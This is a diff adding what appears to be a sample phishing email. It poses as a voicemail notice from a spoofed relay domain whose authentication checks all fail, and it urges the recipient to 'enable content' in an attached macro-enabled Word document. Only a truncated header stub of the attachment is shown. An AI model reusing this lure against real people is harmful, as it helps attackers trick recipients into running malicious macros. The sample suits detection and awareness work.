@@ -1,0 +1,30 @@
+Return-Path: <voicemail@unified-comms-relay.ga>
+Received: from unified-comms-relay.ga ([45.156.23.12]) by mx.company.com with ESMTP id g7; Tue, 8 Sep 2026 11:45:00 +0000
+Authentication-Results: mx.company.com; spf=fail smtp.mailfrom=unified-comms-relay.ga; dkim=none; dmarc=fail
+From: "Voicemail Service" <voicemail@unified-comms-relay.ga>
+To: jaswanth@company.com
+Subject: New voicemail from +91 80 4412 8890 (1 min 42 sec)
+Date: Tue, 8 Sep 2026 11:45:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="=_V1"
+
+--=_V1
+Content-Type: text/plain; charset=utf-8
+
+You have a new voicemail message.
+
+From: +91 80 4412 8890
+Received: 22 Sep 2026 11:42
+Duration: 1:42
+
+The transcript is in the attached document. Enable content to play the audio.
+
+--=_V1
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Voicemail_Transcript.docm"
+Content-Disposition: attachment; filename="Voicemail_Transcript.docm"
+Content-Transfer-Encoding: base64
+
+0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAAQAAAAAAAAAA
+EAAAAgAAAAEAAAD+////AAAAAAAAAAD/////////////////////////////////////////////
+
+--=_V1--
